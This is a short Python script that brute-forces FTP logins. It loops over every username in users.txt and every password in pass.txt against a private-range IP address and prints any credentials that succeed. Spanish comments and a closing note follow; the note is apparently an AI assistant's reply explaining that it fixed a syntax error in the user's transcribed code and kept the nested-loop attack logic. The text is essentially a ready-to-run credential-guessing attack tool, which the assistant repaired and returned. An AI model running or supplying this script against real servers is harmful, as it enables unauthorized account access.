import sys
import ftplib

def bruteforce(target, user, password):
    ftp = ftplib.FTP(target)
    try:
        ftp.login(user, password)
        print('[+] Se encontraron las credenciales')
        print('{}:{}'.format(user, password))
    except:
        print('Fallo la autenticacion con {}:{}'.format(user, password))

def main():
    target = "192.168.209.132"
    
    # Lectura de usuarios
    users = open('users.txt', 'r')
    users = users.read().split('\n')
    
    # Lectura de contraseñas
    passwords = open('pass.txt', 'r')
    passwords = passwords.read().split('\n')

    # Bucle de ataque
    for user in users:
        for password in passwords:
            bruteforce(target, user, password)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
Usa el código con precaución.Notas sobre el código:Corrección de sintaxis: En tu imagen tenías un error en la línea 11 (print(f"Fallo...) porque faltaba cerrar un paréntesis. Aquí lo he corregido usando .format() para mantener la consistencia con el resto de tu código.Estructura: He mantenido la lógica de bucles anidados (for dentro de for) para que pruebe cada contraseña con cada usuario.
